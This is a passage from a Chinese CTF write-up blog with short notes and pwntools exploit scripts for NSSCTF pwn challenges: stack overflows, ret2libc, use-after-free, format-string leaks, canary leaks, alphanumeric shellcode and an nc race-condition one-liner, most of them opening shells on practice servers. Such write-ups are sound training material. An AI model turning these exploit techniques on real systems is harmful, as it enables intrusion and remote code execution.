即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28296)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p64(0x401257)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022ezheap\"><a class=\"anchor\" href=\"#nisactf-2022ezheap\">#</a> [NISACTF 2022]ezheap</h5>\n<p>这题还没来得及打开看就出了，直接运行发现输入很多下面的报错是 sh，并且提示哪里多了，那我们就直接卡溢出那里运行就好</p>\n<h5 id=\"wustctf-2020getshell2\"><a class=\"anchor\" href=\"#wustctf-2020getshell2\">#</a> [WUSTCTF 2020]getshell2</h5>\n<p>sh 相当于执行 /bin/sh</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28650)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x18+0x4)+p32(0x8048529)+p32(0x08048670)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022uaf\"><a class=\"anchor\" href=\"#nisactf-2022uaf\">#</a> [NISACTF 2022]UAF</h5>\n<p>新手的第一个 uaf 题目这个题目很友好让我不太难受，checksec 看一下就明白开启了 canary，但是没有泄露我在 stack 上准备泄露他但是不行，直接死循环，32 位拖进 ida 看 f5 了，发现 f5 里面的函数有很多，并且逻辑分明，那只有慢慢审计了，看 main 函数发现是一个菜单有 create、edit、del、show，并且里面还有一个 system，感觉像是看到了新大陆一样，根据题目来就是 uaf，百度搜索一下就能发现 free 的漏洞，使用了 malloc 分配了内存空间给一个数字但是 free 没有清空只是暂时释放了，只要下一个同样申请一样的内存的话内存地址就会一样，再看 edit 能发现这个 if 语句能够修改 0 并且在里面输入值，然后就是 del，使用 free 释放空间，在之后就是 show 来查看 edit 写入的值，那就可有来构造 uaf 漏洞了。<br />\n`` 如果说有要注意的，就是利用 show 功能 get_shell 的时候只能使用索引为 0 的堆块，而 edit 不能编辑索引为 0 的堆块，所以就要用到 UAF 了因为 if (v1 &lt;= 0 || v1&gt; i ) 其中 0 可以通过</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28338)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">def create():</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\">def edit(index,string):</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;2&#x27;)</span><br><span class=\"line\">    p.sendlineafter(&#x27;page&#x27;,index)</span><br><span class=\"line\">    p.sendlineafter(&#x27;strings&#x27;,string)</span><br><span class=\"line\">def dela(index):</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;3&#x27;)</span><br><span class=\"line\">    p.sendlineafter(&#x27;page&#x27;,index)</span><br><span class=\"line\">def show(index):</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;4&#x27;)</span><br><span class=\"line\">    p.sendlineafter(&#x27;page&#x27;,index)</span><br><span class=\"line\">create()</span><br><span class=\"line\">dela(&#x27;0&#x27;)</span><br><span class=\"line\">create()</span><br><span class=\"line\">payload=b&#x27;sh;\\x00&#x27;+p32(0x8048642)</span><br><span class=\"line\">edit(&#x27;1&#x27;,payload)</span><br><span class=\"line\">show(&#x27;0&#x27;)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babyrop\"><a class=\"anchor\" href=\"#bjdctf-2020babyrop\">#</a> [BJDCTF 2020]babyrop</h5>\n<p>本题使用的是 libc6_2.23-0ubuntu11_amd64</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">a=0</span><br><span class=\"line\"></span><br><span class=\"line\">if a:</span><br><span class=\"line\"></span><br><span class=\"line\"> p=process(&#x27;./pw&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">else:</span><br><span class=\"line\"></span><br><span class=\"line\"> p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28892)</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./pw&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">rdi_pop=0x400733</span><br><span class=\"line\"></span><br><span class=\"line\">ret=0x4004c9</span><br><span class=\"line\"></span><br><span class=\"line\">main=elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;story!&#x27;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">puts=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(puts)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(&#x27;puts&#x27;,puts)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=puts-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">str_bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2=b&#x27;a&#x27;*(0x20+0x8)+p64(ret)+p64(rdi_pop)+p64(str_bin_sh)+p64(system)+p64(main)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1safe_shellcode\"><a class=\"anchor\" href=\"#hnctf-2022-week1safe_shellcode\">#</a> [HNCTF 2022 Week1]safe_shellcode</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28251)</span><br><span class=\"line\">payload=&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00gao@fossa&quot;</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hgame-2022-week1test-your-gdb\"><a class=\"anchor\" href=\"#hgame-2022-week1test-your-gdb\">#</a> [HGAME 2022 week1]test your gdb</h5>\n<p><figure class=\"highlight plaintext\"><figcaption><span>pwn import *</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#p = process(&quot;./../testYourGdb&quot;)</span><br><span class=\"line\">elf = ELF(&quot;./../testYourGdb&quot;)</span><br><span class=\"line\">p = remote(&quot;1.14.71.254&quot;,28150)</span><br><span class=\"line\"></span><br><span class=\"line\">cmpText = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = 0x401256</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(b&#x27;word\\n&#x27;)</span><br><span class=\"line\">p.send(cmpText)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv(0x18)</span><br><span class=\"line\">canary = u64(p.recv(8))</span><br><span class=\"line\">print(hex(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">padding = b&#x27;a&#x27; * (0x28 - 0x10)</span><br><span class=\"line\">payload = padding + p64(canary) + p64(0) + p64(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ezr0p64\"><a class=\"anchor\" href=\"#hnctf-2022-week1ezr0p64\">#</a> [HNCTF 2022 Week1]ezr0p64</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">已经给了.so.6了直接打ret2libc</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">context.os=&#x27;linux&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./ezrop64&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28053)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret = 0x4012a3</span><br><span class=\"line\"></span><br><span class=\"line\">ret = 0x40101a</span><br><span class=\"line\"></span><br><span class=\"line\">vuln = elf.sym[&#x27;vuln&#x27;]</span><br><span class=\"line\">p.recvuntil(b&quot;:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr = int(p.recv(14),16)</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(puts_addr)</span><br><span class=\"line\">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = libc_base + next(libc.search(b&quot;/bin/sh\\x00&quot;))</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x108 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gdouctf-2023真男人下120层\"><a class=\"anchor\" href=\"#gdouctf-2023真男人下120层\">#</a> [GDOUCTF 2023] 真男人下 120 层</h5>\n<p>套着两层 rand 需要定义两次 srand 使用 python 的 ctypes 的库来进行解题</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">import ctypes</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.srand.argtypes=[ctypes.c_uint]</span><br><span class=\"line\"></span><br><span class=\"line\">libc.srand(libc.time(0))</span><br><span class=\"line\"></span><br><span class=\"line\">rand_result=libc.rand()</span><br><span class=\"line\"></span><br><span class=\"line\">libc.srand(rand_result%3-1522127470)</span><br><span class=\"line\"></span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28105)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(&#x27;trap.&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(120):</span><br><span class=\"line\"></span><br><span class=\"line\">    rand_r=libc.rand()%4+1</span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(b&#x27;Floor&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(str(rand_r))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hubuctf-2022-新生赛fmt\"><a class=\"anchor\" href=\"#hubuctf-2022-新生赛fmt\">#</a> [HUBUCTF 2022 新生赛] fmt</h5>\n<p>本地测试查看 flag.txt 被读后的栈地址看到偏移多少利用 % p 来获得 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28473)</span><br><span class=\"line\"># get flag</span><br><span class=\"line\"># 根据 format 和 s 在栈上的相对位置计算读取位置：(0x60 - 0x40 / 8) + 5 = 12</span><br><span class=\"line\">flag_addr = 12</span><br><span class=\"line\">flag = &#x27;&#x27;</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    p.sendlineafter(b&#x27;Echo as a service&#x27;, &#x27;%&#123;&#125;$p&#x27;.format(flag_addr))</span><br><span class=\"line\">    p.recvuntil(b&#x27;0x&#x27;)</span><br><span class=\"line\">    part = p.recvuntil(b&#x27;\\n&#x27;)[:-1]</span><br><span class=\"line\">    for i in range(0, len(part), 2):</span><br><span class=\"line\">        index = len(part) - i</span><br><span class=\"line\">        flag += chr(int(part[index - 2:index].ljust(2, b&#x27;0&#x27;), 16))</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">    if &#x27;&#125;&#x27; in flag:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    flag_addr += 1</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ezcmp\"><a class=\"anchor\" href=\"#hnctf-2022-week1ezcmp\">#</a> [HNCTF 2022 Week1]ezcmp</h5>\n<p>ida 查看到他必须要和 buf 相同才能得到 shell 那我们就去 gdb 调试查看 buff 的值 x/10a 可以查看到 buff 的值段把他输进 buf 即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">#context(log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28286)</span><br><span class=\"line\">payload=p64(0x144678aadc0e4072)+p64(0x84b6e81a4c7eb0e2)+p64(0xf426588abcee2052)+p64(0xc8cb2c5e90c2)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"litctf-2023狠狠的溢出涅~\"><a class=\"anchor\" href=\"#litctf-2023狠狠的溢出涅~\">#</a> [LitCTF 2023] 狠狠的溢出涅～</h5>\n<p>新知识 \\x00 能够截断 strlen</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       = lambda data               :io.send(data)</span><br><span class=\"line\">sa      = lambda delim,data         :io.sendafter(str(delim), data)</span><br><span class=\"line\">sl      = lambda data               :io.sendline(data)</span><br><span class=\"line\">sla     = lambda delim,data         :io.sendlineafter(str(delim), data)</span><br><span class=\"line\">r       = lambda num                :io.recv(num)</span><br><span class=\"line\">ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = lambda                    :io.interactive()</span><br><span class=\"line\">uu32    = lambda data               :u32(data.ljust(4,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">uu64    = lambda data               :u64(data.ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">ls      = lambda data               :log.success(data)</span><br><span class=\"line\"></span><br><span class=\"line\">binary = &#x27;./pwn4&#x27;</span><br><span class=\"line\">libelf = &#x27;./libc-2.31.so&#x27;</span><br><span class=\"line\">target = &#x27;&#x27;</span><br><span class=\"line\">target = &#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch      = &#x27;amd64&#x27;</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\">context.terminal  = [&#x27;tme?mux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;130&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(&#x27;node4.anna.nssctf.cn&#x27;,28710)</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(binary)</span><br><span class=\"line\"></span><br><span class=\"line\">pad = 0x68</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(binary)</span><br><span class=\"line\">rop = ROP(binary)</span><br><span class=\"line\">libc = ELF(libelf)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret = rop.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;])[0]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\">vuln = 0x4006B0</span><br><span class=\"line\">ret = 0x0400768</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pay = pad * b&#x27;\\x00&#x27; + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)</span><br><span class=\"line\">sl(pay)</span><br><span class=\"line\">ru(&#x27;Received\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">x = uu64(r(6))</span><br><span class=\"line\">libc_base = x - libc.sym[&#x27;puts&#x27;]</span><br><span class=\"line\">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class=\"line\">bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\">ls(hex(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pay = pad * b&#x27;\\x00&#x27; + p64(ret)*1 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(vuln)</span><br><span class=\"line\">sl(pay)</span><br><span class=\"line\">sl(&#x27;ls&#x27;)</span><br><span class=\"line\">sl(&#x27;cat flag&#x27;)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week2ez_backdoor\"><a class=\"anchor\" href=\"#hnctf-2022-week2ez_backdoor\">#</a> [HNCTF 2022 WEEK2]ez_backdoor</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import time</span><br><span class=\"line\">io = remote(&#x27;node5.anna.nssctf.cn&#x27;,28762)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">#io = process(binary)</span><br><span class=\"line\">bin_sh=0x4011CA</span><br><span class=\"line\">ret=0x40101a</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x108)+p64(ret)+p64(bin_sh)</span><br><span class=\"line\">io.sendafter(b&#x27;llenge\\n&#x27;,payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022shop_pwn\"><a class=\"anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h5>\n<p>ida 查看 game 函数里面有一个函数来创建多线程，但是有个 bug，money 是公共资源，这个线程创建时另外一个线程也创建了，如果太快会造成都在卖那个 pen 直接构造一个</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo -e &quot;3\\n0\\n3\\n0\\n2\\n1\\n1\\&quot;|nc node5.anna.nssctf.cn 28765</span><br></pre></td></tr></table></figure></p>\n<p>即可查看到 flag</p>\n<h5 id=\"hdctf-2023keep-on\"><a class=\"anchor\" href=\"#hdctf-2023keep-on\">#</a> [HDCTF 2023]KEEP ON</h5>\n<p>这个题注意的字符串溢出是一个点还能够利用栈迁移来获取 shell，字符串溢出的话是利用 printf 的溢出点是 6 然后使用 fmtstr_payload 来让 system_plt 来和 printf_got 进行切换在利用后面那个 read 允许溢出 8 个字节来返回到 vuln 去在字符串溢出这里输入 /bin/sh 即可得到 shell</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>ON</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\">elf = ELF(&quot;./hdctf&quot;)</span><br><span class=\"line\">#p = process(&#x27;./hdctf&#x27;)</span><br><span class=\"line\">p = 